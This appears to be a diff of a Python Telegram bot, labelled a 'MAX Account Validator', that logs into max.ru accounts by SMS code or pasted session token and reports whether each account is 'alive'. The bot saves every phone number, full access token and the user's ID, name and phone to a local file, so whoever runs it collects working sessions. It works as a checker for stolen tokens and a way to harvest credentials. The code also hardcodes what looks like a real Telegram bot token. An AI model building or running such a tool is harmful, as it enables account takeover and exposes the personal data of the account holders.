@@ -1,10 +1,9 @@
 import asyncio
 import telebot
+from telebot import types
 import logging
 
-# ============ ВСТАВЬ СВОЙ ТОКЕН СЮДА ============
 BOT_TOKEN = "8407984730:AAGVNP8TWRP7AcsrWk5xod0z8qbsW7qt3lE"
-# =================================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -22,6 +21,8 @@ HEADERS = {
     "Origin": "https://max.ru",
     "Referer": "https://max.ru/auth/login"
 }
+
+# ============ ФУНКЦИИ ДЛЯ РАБОТЫ С MAX ============
 
 def request_sms_code(phone):
     try:
@@ -55,22 +56,44 @@ def confirm_code(phone, code, session_id):
     except Exception as e:
         return False, None, f"Ошибка соединения: {e}"
 
-def check_session_valid(access_token):
+def check_session_by_token(access_token):
+    """Проверяет сессию по токену. Возвращает (статус, информация)."""
     try:
         resp = __import__('requests').get(MAX_CHECK_SESSION_URL, headers={**HEADERS, "Authorization": f"Bearer {access_token}"}, timeout=15)
         data = resp.json()
         if resp.status_code == 200 and data.get("valid"):
             user_info = data.get("user", {})
-            return True, f"ID: {user_info.get('id', 'N/A')}\nИмя: {user_info.get('name', 'N/A')}"
+            info = f"ID: {user_info.get('id', 'N/A')}\nИмя: {user_info.get('name', 'N/A')}\nТелефон: {user_info.get('phone', 'N/A')}"
+            return True, info
         else:
             return False, "Сессия недействительна"
     except Exception as e:
         return False, f"Ошибка проверки: {e}"
 
+# ============ КЛАВИАТУРЫ ============
+
+def main_keyboard():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    markup.add("📱 Войти по номеру", "🔑 Войти по токену")
+    return markup
+
+def cancel_keyboard():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    markup.add("❌ Отмена")
+    return markup
+
+# ============ ОБРАБОТЧИКИ КОМАНД ============
+
 @bot.message_handler(commands=['start'])
 def start(message):
-    user_states[message.chat.id] = {"state": "waiting_phone"}
-    bot.reply_to(message, "🔐 **MAX Account Validator**\n\n📱 Введите номер телефона:\n`+7XXXXXXXXXX`", parse_mode="Markdown")
+    user_states.pop(message.chat.id, None)
+    bot.reply_to(message, 
+        "🔐 **MAX Account Validator**\n\nВыберите способ входа:",
+        parse_mode="Markdown",
+        reply_markup=main_keyboard()
+    )
+
+# ============ ОСНОВНОЙ ОБРАБОТЧИК ============
 
 @bot.message_handler(func=lambda m: True)
 def handle_message(message):
@@ -78,15 +101,33 @@ def handle_message(message):
     text = message.text.strip()
     state = user_states.get(chat_id, {}).get("state")
 
+    # --- Отмена ---
+    if text == "❌ Отмена":
+        user_states.pop(chat_id, None)
+        bot.reply_to(message, "Отменено.", reply_markup=main_keyboard())
+        return
+
+    # --- Выбор способа входа ---
+    if text == "📱 Войти по номеру":
+        user_states[chat_id] = {"state": "waiting_phone", "mode": "phone"}
+        bot.reply_to(message, "📱 Введите номер телефона:\n`+7XXXXXXXXXX`", parse_mode="Markdown", reply_markup=cancel_keyboard())
+        return
+
+    if text == "🔑 Войти по токену":
+        user_states[chat_id] = {"state": "waiting_token", "mode": "token"}
+        bot.reply_to(message, "🔑 Вставьте токен сессии MAX:\n\n`An_Sx6HQ9HDiZMh...`", parse_mode="Markdown", reply_markup=cancel_keyboard())
+        return
+
+    # ============ РЕЖИМ: ПО НОМЕРУ ============
     if state == "waiting_phone":
         phone = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
         if not phone.startswith("+"):
             phone = "+7" + phone.lstrip("87")
-        bot.reply_to(message, f"📱 Проверяю номер `{phone}`...", parse_mode="Markdown")
+        bot.reply_to(message, f"📱 Запрашиваю SMS-код для `{phone}`...", parse_mode="Markdown")
         success, session_id, msg = request_sms_code(phone)
         if success:
-            user_states[chat_id] = {"state": "waiting_code", "phone": phone, "session_id": session_id}
-            bot.reply_to(message, f"✅ {msg}\n\n📩 Введите 6-значный код из SMS:")
+            user_states[chat_id] = {"state": "waiting_code", "phone": phone, "session_id": session_id, "mode": "phone"}
+            bot.reply_to(message, f"✅ {msg}\n\n📩 Введите 6-значный код из SMS:", reply_markup=cancel_keyboard())
         else:
             bot.reply_to(message, f"❌ {msg}")
 
@@ -100,16 +141,35 @@ def handle_message(message):
         bot.reply_to(message, "🔐 Выполняю вход...")
         success, access_token, msg = confirm_code(phone, code, session_id)
         if success:
-            valid, info = check_session_valid(access_token)
+            valid, info = check_session_by_token(access_token)
             if valid:
-                bot.reply_to(message, f"🟢 **АККАУНТ ЖИВОЙ!**\n\n```\n{info}\n```", parse_mode="Markdown")
+                bot.reply_to(message, f"🟢 **АККАУНТ ЖИВОЙ!**\n\n```\n{info}\n```\n\n🔑 Токен:\n`{access_token[:40]}...`", parse_mode="Markdown", reply_markup=main_keyboard())
                 with open("valid_accounts.txt", "a") as f:
-                    f.write(f"{phone} | {access_token} | {info}\n")
+                    f.write(f"[PHONE] {phone} | {access_token} | {info}\n")
             else:
-                bot.reply_to(message, f"🔴 {info}")
+                bot.reply_to(message, f"🔴 {info}", reply_markup=main_keyboard())
             user_states.pop(chat_id, None)
         else:
             bot.reply_to(message, f"❌ {msg}")
+
+    # ============ РЕЖИМ: ПО ТОКЕНУ ============
+    elif state == "waiting_token":
+        access_token = text.strip()
+        # Убираем случайные пробелы/переносы
+        access_token = access_token.replace(" ", "").replace("\n", "")
+        if len(access_token) < 50:
+            bot.reply_to(message, "❌ Слишком короткий токен. Попробуйте ещё раз:", reply_markup=cancel_keyboard())
+            return
+        bot.reply_to(message, "🔍 Проверяю токен...")
+        valid, info = check_session_by_token(access_token)
+        if valid:
+            bot.reply_to(message, f"🟢 **СЕССИЯ АКТИВНА!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
+            with open("valid_accounts.txt", "a") as f:
+                f.write(f"[TOKEN] {access_token} | {info}\n")
+        else:
+            bot.reply_to(message, f"🔴 {info}", reply_markup=main_keyboard())
+        user_states.pop(chat_id, None)
+
 
 if __name__ == "__main__":
     print("🤖 MAX Validator запущен...")
